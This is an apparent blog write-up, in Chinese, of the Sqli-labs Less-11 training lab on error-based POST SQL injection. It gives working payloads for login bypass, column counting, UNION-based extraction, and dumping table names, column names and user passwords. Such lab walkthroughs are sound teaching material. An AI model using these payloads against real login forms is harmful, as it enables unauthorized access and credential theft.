---
title: Sqli-labs Less-11 Writeup
date: 2026-11-16
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web, POST注入]
---
## 一、 漏洞概述
- **关卡**：Less-11
- **漏洞类型**：基于报错的 POST 型 SQL 注入（Error-Based POST SQL Injection）
- **注入点**：登录表单的 `uname` 参数
- **闭合方式**：单引号 `'`

## 二、 渗透测试过程

### 1. 探测注入点与闭合方式
访问 Less-11 关卡，页面为一个登录表单。由于是 POST 请求，需使用 Burp Suite 开启代理拦截数据包。

尝试在用户名处输入 `admin'`，密码随意（如 `123`），拦截并放行请求。页面返回 SQL 语法错误信息：
`You have an error in your SQL syntax... near ''admin'' AND password='123' LIMIT 0,1' at line 1`。
由此确认，`uname` 参数存在单引号 `'` 闭合的字符型注入漏洞，且页面有报错回显。

### 2. 登录绕过（万能密码测试）
利用 MySQL 注释符截断后续的密码验证逻辑。
- **Payload (Burp 拦截修改)**：
  ```text
  uname=admin' #&passwd=123&submit=Submit


· 结果：成功登录，页面回显用户信息，证明注释符 # 生效，绕过了密码验证。

### 3. 确定字段数量

利用 ORDER BY 语句确定当前查询的字段数。

· Payload：
  ```text
  uname=-1' order by 2 #&passwd=123&submit=Submit
  ```
· 测试结果：order by 2 页面正常，order by 3 页面报错。确认当前查询字段数为 2。

### 4. 确定回显位

使用 UNION SELECT 联合查询，并利用 -1 使前置查询为空，以获取回显位置。

· Payload：
  ```text
  uname=-1' union select 1,2 #&passwd=123&submit=Submit
  ```
· 结果：页面分别回显了数字 1 和 2，确认两个字段均可作为回显位。

### 5. 获取数据库信息

将回显位替换为数据库函数或信息。

· Payload (获取库名与当前用户)：
  ```text
  uname=-1' union select database(),user() #&passwd=123&submit=Submit
  ```
· 结果：页面回显数据库名为 security，当前数据库用户为 root@localhost。

## 三、 通关 Payload 汇总

所有操作均需在 Burp Suite 或浏览器开发者工具 (F12) 中修改 POST 请求体的 uname 参数。

测试目的 Payload (仅限 uname 字段)
测试闭合 admin'
登录绕过 admin' #
判断字段数 -1' order by 2 #
获取库名 -1' union select 1,database() #
获取表名 -1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security' #
获取字段名 -1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
获取账号密码 -1' union select 1,group_concat(username,0x3a,password) from users #

注意：不同环境下，若 # 号被过滤或截断，可替换为 --+ 或 -- -。POST 请求中，数据长度受 Content-Length 影响，使用 Burp 时建议开启 Update Content-Length 选项。

```
